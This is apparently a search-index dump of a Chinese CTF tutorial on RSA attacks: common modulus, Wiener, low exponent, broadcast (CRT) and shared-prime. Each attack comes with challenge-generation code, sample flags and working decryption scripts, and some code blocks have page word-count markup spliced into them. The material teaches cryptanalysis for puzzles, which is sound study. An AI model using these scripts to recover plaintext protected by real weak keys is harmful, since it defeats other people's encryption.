4022844221949818486992653054085916326074567355928744181958934887632087019273037034539054980148783728604561167417571308543568511557184742388987903995431328908643666134429145944816840592528868078022503367301892068877343146684216682292031\ne2=23333\nc2=4005739533838233872100900192412804692746056018222370689494999429600683965220671145551011781360384072398973847079099863801781412654844344905559510784496389730242858693821886631397324132791823439680955157172958658051082121321917953586754734740594115385719917993135141183252010390389651513644552790616554115701338569755344442572426665297172781226400939991451728779259308086811204397695171302495091439788703682660000347393283282772216143916787270940246611837483151694679246528820414931162726657909701256510917389048934521382784300651451892299324944208983841733409704979351560563883697858790944929943311340614454947233485\n\n\n#\u5171\u6a21\u653b\u51fb\n#\u5171\u6a21\u653b\u51fb\u51fd\u6570\ndef rsa_gong_N_def(e1,e2,c1,c2,n):\n    e1, e2, c1, c2, n=int(e1),int(e2),int(c1),int(c2),int(n)\n    print(\"e1,e2:\",e1,e2)\n    print(gmpy2.gcd(e1,e2))\n    s = gmpy2.gcdext(e1, e2)\n    print(s)\n    s1 = s[1]\n    s2 = s[2]\n    if s1 &lt; 0:\n        s1 = - s1\n        c1 = gmpy2.invert(c1, n)\n    elif s2 &lt; 0:\n        s2 = - s2\n        c2 = gmpy2.invert(c2, n)\n    m = (pow(c1,s1,n) * pow(c2 ,s2 ,n)) % n\n    return int(m)\n\nm = rsa_gong_N_def(e1,e2,c1,c2,n)\nprint(m)\nprint(libnum.n2s(int(m)).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P07.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/#22018","title":"\u9898\u76ee2\uff08\u5bc6\u94a5\u578b\uff0c\u8ddf2018\u5e74\u5dc5\u5cf0\u6781\u5ba2\u7684\u7c7b\u4f3c\uff09","text":"<pre><code>import libnum\nfrom Crypto.PublicKey import RSA\nimport base64\np=libnum.generate_prime(1024)\nq=libnum.generate_prime(1024)\ne1=2333\ne2=23333\nn=p*q\nm=\"flag{09edeb8aa1db60814c34da8994590758}\"\nm=libnum.s2n(m)\nn=p*q\nc1=pow(m,e1,n)\nc2=pow(m,e2,n)\n#print \"d:\",d\n\nrsa_components = (n, e1)\nkeypair = RSA.construct(rsa_components)\nwith open('pubkey1.pem', 'wb') as f :\n    f.write(keypair.exportKey())\n\nrsa_components = (n, e2)\nkeypair = RSA.construct(rsa_components)\nwith open('pubkey2.pem', 'wb') as f :\n    f.write(keypair.exportKey())\n\nwith open(\"c1.enc\",\"wb\") as f:\n    f.write(base64.b64encode(libnum.n2s(c1)))\nwith open(\"c2.enc\",\"wb\") as f:\n    f.write(base64.b64encode(libnum.n2s(c2)))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P07.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/#2","title":"\u9898\u76ee2\u89e3\u5bc6\u811a\u672c","text":"<pre><code>#coding:utf-8\nimport gmpy2\nimport libnum\nfrom Crypto.PublicKey import RSA\nimport base64\n\nwith open(\"pubkey1.pem\",\"rb\") as f:\n    key = RSA.import_key(f.read())\n    n1=key.n\n    e1=key.e\n\nwith open(\"pubkey2.pem\",\"rb\") as f:\n    key = RSA.import_key(f.read())\n    n2=key.n\n    e2=key.e\n\nwith open(\"c1.enc\",\"rb\") as f:\n    c1=f.read()\n    c1=base64.b64decode(c1)\n    c1=libnum.s2n(c1)\nwith open(\"c2.enc\",\"rb\") as f:\n    c2=f.read()\n    c2=base64.b64decode(c2)\n    c2=libnum.s2n(c2)\n\nn=n1\n# \u5171\u6a21\u653b\u51fb\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 498 \u4e2a\u5b57 :fontawesome-solid-code: 134 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f\n&lt;/div&gt;\n# \u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\ns = gmpy2.gcdext(e1, e2)\ns1 = s[1]\ns2 = -s[2]\n#\u6c42\u9006\u5143\nc2 = gmpy2.invert(c2, n)\nm = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n\nprint(m)\nprint(libnum.n2s(int(m)).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P07.%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/#_2","title":"\u5171\u6a21\u653b\u51fb\u539f\u7406","text":"<p>https://www.dazhuanlan.com/2019/12/18/5df98f54585e8/</p> <p>\u4e24\u4e2a\u53ca\u4ee5\u4e0a\u7684\u516c\u94a5(n,e)\u6765\u52a0\u5bc6\u540c\u4e00\u6761\u4fe1\u606fm <pre><code>c1 = pow(m, e1, n)\nc2 = pow(m, e2, n)\n</code></pre> e1\uff0ce2\u4e92\u8d28\uff0c\u5219\u6709</p> <p><pre><code>gcd(e1,e2)=1\n</code></pre> \u6839\u636e\u6269\u5c55\u6b27\u51e0\u91cc\u5fb7\u7b97\u6cd5 \u5bf9\u4e8e\u4e0d\u5b8c\u5168\u4e3a 0 \u7684\u6574\u6570 a\uff0cb\uff0cgcd\uff08a\uff0cb\uff09\u8868\u793a a\uff0cb \u7684\u6700\u5927\u516c\u7ea6\u6570\u3002\u90a3\u4e48\u4e00\u5b9a\u5b58\u5728\u6574\u6570 x\uff0cy \u4f7f\u5f97 gcd\uff08a\uff0cb\uff09=ax+by <pre><code>e1*s1+e2*s2 = 1\n</code></pre> s1\u3001s2\u7686\u4e3a\u6574\u6570\uff0c\u4f46\u662f\u4e00\u6b63\u4e00\u8d1f\uff0c\u5047\u8bbes1\u4e3a\u6b63\u6570,s2\u4e3a\u8d1f\u6570</p> <p>\u56e0\u4e3a <pre><code>c1 = m^e1%n\nc2 = m^e2%n\n</code></pre> \u53ef\u5f97\uff1a <pre><code>(c1^s1*c2^s2)%n = ((m^e1%n)^s1(m^e2%n)^s2)%n\n</code></pre> \u6839\u636e\u6a21\u8fd0\u7b97\u6027\u8d28\uff1a \u5e42\u8fd0\u7b97\u662f\u4e00\u79cd\u5173\u4e8e\u5e42\u7684\u6570\u5b66\u8fd0\u7b97\u3002\u540c\u5e95\u6570\u5e42\u76f8\u4e58\uff0c\u5e95\u6570\u4e0d\u53d8\uff0c\u6307\u6570\u76f8\u52a0\u3002\u540c\u5e95\u6570\u5e42\u76f8\u9664\uff0c\u5e95\u6570\u4e0d\u53d8\uff0c\u6307\u6570\u76f8\u51cf\u3002\u5e42\u7684\u4e58\u65b9\uff0c\u5e95\u6570\u4e0d\u53d8\uff0c\u6307\u6570\u76f8\u4e58\u3002</p> <pre><code>(a * b) % p = (a % p * b % p) % p\na ^ b % p = ((a % p) ^ b) % p\n</code></pre> <p>\u7b80\u5316\u516c\u5f0f\u4e3a\uff1a <pre><code>(c1^s1*c2^s2)%n = ((m^e1%n)^s1*(m^e2%n)^s2)%n\n\n=&gt; (c1^s1*c2^s2)%n = ((m^e1%n)^s1%n*(m^e2%n)^s2%n)%n #(a * b) % p = (a % p * b % p) % p\n\n=&gt; (c1^s1*c2^s2)%n = ((m^e1)^s1%n*(m^e2)^s2%n)%n #((a % p) ^ b) % p =a ^ b % p\n\n=&gt; (c1^s1*c2^s2)%n = ((m^e1)^s1*(m^e2)^s2)%n # (a % p * b % p) % p=(a * b) % p\n\n=&gt;(c1^s1*c2^s2)%n = ((m^(e1*s1)*(m^(e2*s2))%n #\u3002\u5e42\u7684\u4e58\u65b9\uff0c\u5e95\u6570\u4e0d\u53d8\uff0c\u6307\u6570\u76f8\u4e58\u3002\n\n(c1^s1*c2^s2)%n = (m^(e1*s1+e2*s2))%n  # \u540c\u5e95\u6570\u5e42\u76f8\u4e58\uff0c\u5e95\u6570\u4e0d\u53d8\uff0c\u6307\u6570\u76f8\u52a0\u3002\n</code></pre> \u56e0\u4e3a e1*s1+e2*s2 = 1 \u5f97\uff1a</p> <p><pre><code>(c1^s1*c2^s2)%n = (m^1)%n\n\n(c1^s1*c2^s2\uff09%n=m\n</code></pre> \u4e0a\u8ff0\u5c31\u662frsa\u5171\u6a21\u653b\u51fb\u7684\u8fc7\u7a0b</p> <p>\u56e0\u6b64\uff0c\u540c\u4e00m\uff0c\u540c\u4e00n,\u4e0d\u540ce\uff0c\u8fdb\u884c\u52a0\u5bc6\u3002\u5728\u4e0d\u9700\u8981\u77e5\u9053d\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u8fdb\u884c\u89e3\u5bc6\u3002</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P08.wiener%28%E7%BB%B4%E7%BA%B3%29%E6%94%BB%E5%87%BB/","title":"P08.wiener(\u7ef4\u7eb3)\u653b\u51fb","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P08.wiener%28%E7%BB%B4%E7%BA%B3%29%E6%94%BB%E5%87%BB/#p08wiener","title":"P08.wiener(\u7ef4\u7eb3)\u653b\u51fb","text":"<p>\u4f4e\u89e3\u5bc6\u6307\u6570\u653b\u51fb</p> <p>\u7ef4\u7eb3\u653b\u51fb\uff1ae\u6307\u6570\u5f88\u5927(\u7406\u8bba\u4e0ad&lt;N**0.25\u6b64\u653b\u51fb\u8d77\u4f5c\u7528)</p> <p>\u7ef4\u7eb3\u653b\u51fb\u539f\u7406\uff1ahttps://zhuanlan.zhihu.com/p/400818185</p> <p>\u672c\u8282\u7684\u811a\u672c\u4e3b\u8981\u53c2\u8003 https://github.com/pablocelayes/rsa-wiener-attack</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P08.wiener%28%E7%BB%B4%E7%BA%B3%29%E6%94%BB%E5%87%BB/#_1","title":"\u51fa\u9898\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P08.wiener%28%E7%BB%B4%E7%BA%B3%29%E6%94%BB%E5%87%BB/#flag","title":"\u968f\u673a\u751f\u6210flag","text":"<pre><code>import random\nimport hashlib\nimport string\n\n#\u5b57\u7b26\u4e32\u5217\u8868\na=string.printable\n#\u968f\u673a\u751f\u6210flag\nfor i in range(10):\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = hashlib.md5(flag.encode()).hexdigest()\n    print(\"flag{\" + flag + \"}\")\n</code></pre> <pre><code>import libnum\nimport random\nimport gmpy2\n#\u751f\u6210\u968f\u673a\u7d20\u6570\np=libnum.generate_prime(512)\nq=libnum.generate_prime(512)\nm=\"flag{20d6e2da95dcc1fa5f5432a436c4be18}\"\n#\u5b57\u7b26\u4e32\u8f6c\u6570\u5b57\nm=libnum.s2n(m)\nn=p*q\nphi_n=(p-1)*(q-1)\n\n#\u8ba1\u7b97d\nwhile True:\n    nbits=1024\n    d = random.getrandbits(nbits // 4)\n    if (libnum.gcd(d, phi_n) == 1 and 36 * pow(d, 4) &lt; n):\n        break\n#\u8ba1\u7b97e\ne = libnum.invmod(d,phi_n)\n\nc=pow(m,e,n)\n\n\nprint (\"n=\",n)\nprint (\"e=\",e)\nprint (\"c=\",c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P08.wiener%28%E7%BB%B4%E7%BA%B3%29%E6%94%BB%E5%87%BB/#_2","title":"\u89e3\u5bc6\u811a\u672c","text":"<pre><code>import gmpy2\nimport libnum\n\ndef continuedFra(x, y):\n    \"\"\"\u8ba1\u7b97\u8fde\u5206\u6570\n    :param x: \u5206\u5b50\n    :param y: \u5206\u6bcd\n    :return: \u8fde\u5206\u6570\u5217\u8868\n    \"\"\"\n    cf = []\n    while y:\n        cf.append(x // y)\n        x, y = y, x % y\n    return cf\ndef gradualFra(cf):\n    \"\"\"\u8ba1\u7b97\u4f20\u5165\u5217\u8868\u6700\u540e\u7684\u6e10\u8fdb\u5206\u6570\n    :param cf: \u8fde\u5206\u6570\u5217\u8868\n    :return: \u8be5\u5217\u8868\u6700\u540e\u7684\u6e10\u8fd1\u5206\u6570\n    \"\"\"\n    numerator = 0\n    denominator = 1\n    for x in cf[::-1]:\n        # \u8fd9\u91cc\u7684\u6e10\u8fdb\u5206\u6570\u5206\u5b50\u5206\u6bcd\u8981\u5206\u5f00\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 61 \u4e2a\u5b57 :fontawesome-solid-code: 110 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f\n&lt;/div&gt;\n        numerator, denominator = denominator, x * denominator + numerator\n    return numerator, denominator\ndef solve_pq(a, b, c):\n    \"\"\"\u4f7f\u7528\u97e6\u8fbe\u5b9a\u7406\u89e3\u51fapq\uff0cx^2\u2212(p+q)\u2217x+pq=0\n    :param a:x^2\u7684\u7cfb\u6570\n    :param b:x\u7684\u7cfb\u6570\n    :param c:pq\n    :return:p\uff0cq\n    \"\"\"\n    par = gmpy2.isqrt(b * b - 4 * a * c)\n    return (-b + par) // (2 * a), (-b - par) // (2 * a)\ndef getGradualFra(cf):\n    \"\"\"\u8ba1\u7b97\u5217\u8868\u6240\u6709\u7684\u6e10\u8fd1\u5206\u6570\n    :param cf: \u8fde\u5206\u6570\u5217\u8868\n    :return: \u8be5\u5217\u8868\u6240\u6709\u7684\u6e10\u8fd1\u5206\u6570\n    \"\"\"\n    gf = []\n    for i in range(1, len(cf) + 1):\n        gf.append(gradualFra(cf[:i]))\n    return gf\n\n\ndef wienerAttack(e, n):\n    \"\"\"\n    :param e:\n    :param n:\n    :return: \u79c1\u94a5d\n    \"\"\"\n    cf = continuedFra(e, n)\n    gf = getGradualFra(cf)\n    for d, k in gf:\n        if k == 0: continue\n        if (e * d - 1) % k != 0:\n            continue\n        phi = (e * d - 1) // k\n        p, q = solve_pq(1, n - phi + 1, n)\n        if p * q == n:\n            return d\n\n\nn=\ne=\nc=\nd=wienerAttack(e, n)\nm=pow(c, d, n)\nprint(libnum.n2s(m).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P09.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB/","title":"P09.\u4f4e\u52a0\u5bc6\u6307\u6570\u653b\u51fb","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P09.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB/#p09","title":"P09.\u4f4e\u52a0\u5bc6\u6307\u6570\u653b\u51fb","text":"<p>\u52a0\u5bc6\u6307\u6570\u6307\u7684\u662fe\uff0ce\u4e00\u822c\u9009\u53d665535\uff0c\u5f53e\u5f88\u5c0f\uff0c\u53ef\u76f4\u63a5\u7834\u89e3\u3002</p> <p>\u8fd9\u7c7b\u653b\u51fb\u5728CTF\u9898\u4e2d\uff0c\u4e00\u822c\u662f e=3</p> <pre><code>\u5982\u679ce=3\uff0c\u4e14m^e&lt;n\uff0cc\u5f003\u6b21\u6839\u5f0f\uff0c\u5f97\u5230m\u3002\n\n\u5982\u679ce=3\uff0c\u4e14m^e&gt;n\uff0c\u90a3\u4e48\u8bbek\uff0c\u6709\uff1a\n c= m^e +kn\n\n\u7206\u7834k\uff0c\u5982\u679cc\u2212kn\u80fd\u5f00\u4e09\u6b21\u6839\u5f0f\uff0c\u5f97\u5230m.\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P09.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB/#_1","title":"\u51fa\u9898\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P09.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB/#flag","title":"\u968f\u673a\u751f\u6210flag","text":"<pre><code>import random\nimport hashlib\nimport string\n\n#\u5b57\u7b26\u4e32\u5217\u8868\na=string.printable\n#\u968f\u673a\u751f\u6210flag\nfor i in range(10):\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = hashlib.md5(flag.encode()).hexdigest()\n    print(\"flag{\" + flag + \"}\")\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P09.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB/#e3","title":"e=3 \u51fa\u9898\u811a\u672c","text":"<pre><code>import libnum\nimport gmpy2\n\n#\u751f\u6210\u968f\u673a\u7d20\u6570\np=libnum.generate_prime(1024)\nq=libnum.generate_prime(1024)\ne=3\nm=\"flag{20d6e2da95dcc1fa5f5432a436c4be18}\"\n#\u5b57\u7b26\u4e32\u8f6c\u6570\u5b57\nm=libnum.s2n(m)\nn=p*q\nphi_n=(p-1)*(q-1)\n#\u6c42\u9006\u5143\nd=gmpy2.invert(e,phi_n)\nc=pow(m,e,n)\n\nprint (\"n=\",n)\nprint (\"e=\",e)\nprint (\"c=\",c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P09.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB/#e3_1","title":"e=3 \u89e3\u5bc6\u811a\u672c","text":"<p><pre><code>import gmpy2\nimport libnum\n\ndef de(c, e, n):\n    k = 0\n    while True:\n        mm = c + n*k\n        result, flag = gmpy2.iroot(mm, e)\n        if True == flag:\n            return result\n        k += 1\ne= 3\nn=\nc=\n\nm=de(c,e,n)\nprint(m)\nprint(libnum.n2s(int(m)).decode())\n</code></pre> \u9644\u5f55 \u591a\u8fdb\u7a0b\u7206\u7834\u811a\u672c</p> <pre><code>#/usr/bin/python\n# coding=utf-8\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 71 \u4e2a\u5b57 :fontawesome-solid-code: 87 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f\n&lt;/div&gt;\nimport gmpy2\nfrom Crypto.PublicKey import RSA\nfrom multiprocessing import Pool\npool = Pool(4)\n\nwith open('./pubkey.pem', 'r') as f:\n    key = RSA.importKey(f)\n    N = key.n\n    e = key.e\nwith open('flag.enc', 'r') as f:\n    cipher = f.read().encode('hex')\n    cipher = int(cipher, 16)\n\n\ndef calc(j):\n    print j\n    a, b = gmpy2.iroot(cipher + j * N, 3)\n    if b == 1:\n        m = a\n        print '{:x}'.format(int(m)).decode('hex')\n        pool.terminate()\n        exit()\n\n\ndef SmallE():\n    inputs = range(0, 130000000)\n    pool.map(calc, inputs)\n    pool.close()\n    pool.join()\n\n\nif __name__ == '__main__':\n    print 'start'\n    SmallE()\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P10.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/","title":"P10.\u4f4e\u52a0\u5bc6\u6307\u6570\u5e7f\u64ad\u653b\u51fb","text":"<p> \u7ea6 115 \u4e2a\u5b57  97 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P10.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/#p10","title":"P10.\u4f4e\u52a0\u5bc6\u6307\u6570\u5e7f\u64ad\u653b\u51fb","text":"<p>\u5982\u679c\u9009\u53d6\u7684\u52a0\u5bc6\u6307\u6570\u8f83\u4f4e\uff0c\u5e76\u4e14\u4f7f\u7528\u4e86\u76f8\u540c\u7684\u52a0\u5bc6\u6307\u6570\u7ed9\u4e00\u4e2a\u63a5\u53d7\u8005\u7684\u7fa4\u53d1\u9001\u76f8\u540c\u7684\u4fe1\u606f\uff0c\u90a3\u4e48\u53ef\u4ee5\u8fdb\u884c\u5e7f\u64ad\u653b\u51fb\u5f97\u5230\u660e\u6587\u3002</p> <p>\u5728CTF\u4e2d\uff0cn\u3001c\u4e0d\u540c\uff0c\u660e\u6587m\uff0ce\u76f8\u540c\uff0c\u5176e\u6bd4\u8f83\u5c0f\u3002\u4f7f\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P10.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/#_1","title":"\u51fa\u9898\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P10.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/#flag","title":"\u968f\u673a\u751f\u6210flag","text":"<pre><code>import random\nimport hashlib\nimport string\n\n#\u5b57\u7b26\u4e32\u5217\u8868\na=string.printable\n#\u968f\u673a\u751f\u6210flag\nfor i in range(10):\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = hashlib.md5(flag.encode()).hexdigest()\n    print(\"flag{\" + flag + \"}\")\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P10.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/#_2","title":"\u9898\u76ee","text":"<pre><code>import libnum\n#\u751f\u6210\u968f\u673a\u7d20\u6570\ndef rsa_def(e,m):\n    p=libnum.generate_prime(1024)\n    q=libnum.generate_prime(1024)\n    #\u5b57\u7b26\u4e32\u8f6c\u6570\u5b57\n    m=libnum.s2n(m)\n    n=p*q\n    c=pow(m,e,n)\n    n_lt.append(n)\n    c_lt.append(c)\n\nn_lt=[]\nc_lt=[]\ne=23\nm='flag{2cb2eb4b2c7fdf4e94e10344be856446}'\nfor i in range(7):\n    rsa_def(e,m)\n\nprint(\"e=\",e)\nprint(\"n=\",n_lt)\nprint(\"c=\",c_lt)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P10.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/#_3","title":"\u89e3\u5bc6\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P10.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/#1","title":"\u89e3\u5bc6\u811a\u672c1","text":"<pre><code>import libnum\nfrom gmpy2 import invert, gcd, iroot\n\n\ndef op(x):\n    res = 1\n    for i in x:\n        res *= i\n    return res\n\n\ndef CRT(m, a):\n    assert (len(m) == len(a))\n    M = op(m)\n    sum = 0\n    for m, a in zip(m, a):\n        Mi = M // m\n        ti = invert(Mi, m)\n        sum += a * ti * Mi\n    return sum % M\ndef GCRT(m, a):\n    assert (len(m) == len(a))\n    curm, cura = m[0], a[0]\n    for m, a in zip(m[1:], a[1:]):\n        d = gcd(curm, m)\n        c = a - cura\n        assert (c % d == 0)\n        K = c // d * invert(curm // d, m // d)\n        cura += curm * K\n        curm = curm * m // d\n    return cura % curm\n\ne= 23\nn=[]\nc=[]\n\nm = CRT(n, c)\nm1 = iroot(m, e)  # \u5f00e\u6b21\u65b9\nprint(m1)\nprint(libnum.n2s(int(m1[0])))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P10.%E4%BD%8E%E5%8A%A0%E5%AF%86%E6%8C%87%E6%95%B0%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/#2","title":"\u89e3\u5bc6\u811a\u672c2","text":"<pre><code>import binascii,gmpy2\nfrom functools import reduce\n\nimport libnum\n\n\ndef CRT(mi, ai):\n    assert(reduce(gmpy2.gcd,mi)==1)\n    assert (isinstance(mi, list) and isinstance(ai, list))\n    M = reduce(lambda x, y: x * y, mi)\n    ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) for (m, a) in zip(mi, ai)]\n    return reduce(lambda x, y: x + y, ai_ti_Mi) % M\n\ne= 23\nn=[]\nc=[]\n\nm=gmpy2.iroot(CRT(n, c), e)[0]\nprint(m)\nprint(libnum.n2s(int(m)))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P11.%E5%85%B1%E4%BA%AB%E7%B4%A0%E6%95%B0-N%E4%B8%8D%E4%BA%92%E7%B4%A0/","title":"P11.\u5171\u4eab\u7d20\u6570-N\u4e0d\u4e92\u7d20","text":"<p> \u7ea6 84 \u4e2a\u5b57  72 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P11.%E5%85%B1%E4%BA%AB%E7%B4%A0%E6%95%B0-N%E4%B8%8D%E4%BA%92%E7%B4%A0/#p11-n","title":"P11.\u5171\u4eab\u7d20\u6570-N\u4e0d\u4e92\u7d20","text":"<p>\u4e24\u4e2an\u91cc\u4f7f\u7528\u6709\u76f8\u540c\u7684\u7d20\u6570p\u6216q \u5728CTF\u4e2d\uff0c\u540c\u6837\u4e00\u4e2ae\uff08\u4e00\u822c\u4e3a65537\uff09\u548cm\uff0c \u6709\u4e24\u4e2a\u6216\u591a\u4e2an\u548cc\u65f6\uff0c\u90a3\u4e48n\u4e4b\u95f4\u53ef\u80fd\u662f\u5171\u4eab\u7d20\u6570</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P11.%E5%85%B1%E4%BA%AB%E7%B4%A0%E6%95%B0-N%E4%B8%8D%E4%BA%92%E7%B4%A0/#_1","title":"\u51fa\u9898\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P11.%E5%85%B1%E4%BA%AB%E7%B4%A0%E6%95%B0-N%E4%B8%8D%E4%BA%92%E7%B4%A0/#flag","title":"\u968f\u673a\u751f\u6210flag","text":"<pre><code>import random\nimport hashlib\nimport string\n\n#\u5b57\u7b26\u4e32\u5217\u8868\na=string.printable\n#\u968f\u673a\u751f\u6210flag\nfor i in range(10):\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = hashlib.md5(flag.encode()).hexdigest()\n    print(\"flag{\" + flag + \"}\")\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P11.%E5%85%B1%E4%BA%AB%E7%B4%A0%E6%95%B0-N%E4%B8%8D%E4%BA%92%E7%B4%A0/#_2","title":"\u9898\u76ee","text":"<pre><code>import libnum\n\n#\u751f\u6210\u968f\u673a\u7d20\u6570\np1=libnum.generate_prime(1024)\np2=libnum.generate_prime(1024)\nq=libnum.generate_prime(1024)\ne=65537\nm=\"flag{c9d48baa792e91ce65d175bb586f8c24}\"\n#\u5b57\u7b26\u4e32\u8f6c\u6570\u5b57\nm=libnum.s2n(m)\nprint(q)\nn1=p1*q\nn2=p2*q\n#\u6c42\u9006\u5143\nc1=pow(m,e,n1)\nc2=pow(m,e,n2)\n\nprint (\"e=\",e)\nprint(\"n1=\",n1)\nprint(\"n2=\",n2)\nprint (\"c1=\",c1)\nprint (\"c2=\",c2)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P11.%E5%85%B1%E4%BA%AB%E7%B4%A0%E6%95%B0-N%E4%B8%8D%E4%BA%92%E7%B4%A0/#_3","title":"\u89e3\u9898\u811a\u672c","text":"<pre><code>import libnum\nimport gmpy2\n\n\ne= 65537\nn1= \nn2= \nc1= \nc2=\n\n#\u6c42\u6700\u5927\u516c\u7ea6\u6570\nq=gmpy2.gcd(n1,n2)\np1=n1//q\n\nphi_n=(q-1)*(p1-1)\n#\u6c42\u9006\u5143d\nd1=libnum.invmod(e,phi_n)\nm=pow(c1,d1,n1)\nprint(m)\n#\u6570\u5b57\u8f6c\u5b57\u8282\uff0c\u8f6c\u5b57\u7b26\u4e32\nprint(libnum.n2s(int(m)).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P11.%E5%85%B1%E4%BA%AB%E7%B4%A0%E6%95%B0-N%E4%B8%8D%E4%BA%92%E7%B4%A0/#sage","title":"\u6a21\u4e0d\u4e92\u7d20,\u53e6\u7c7b\u811a\u672c sage","text":"<pre><code>e= 65537\nn1= 21093893530165595850339636291340886775560459889174993298599564679470961520127537242137351793326916956073009495303622153882623912792088101281148271957920985536369095953335024370158909102755939425266322061024660469804331164229029302486833732919273709880115072578649082360889893770131535569945349586879686172801621707802368786052168013925892590355941771860436819249314675001571361991296570354259045254453585842424561844676250437625123809885279029491512960326206418322762119343167800501997630708987739950144724219375568233516957162796160222178022591375724806703162674485897117438453945303273004012532132059011075717387753\nn2= 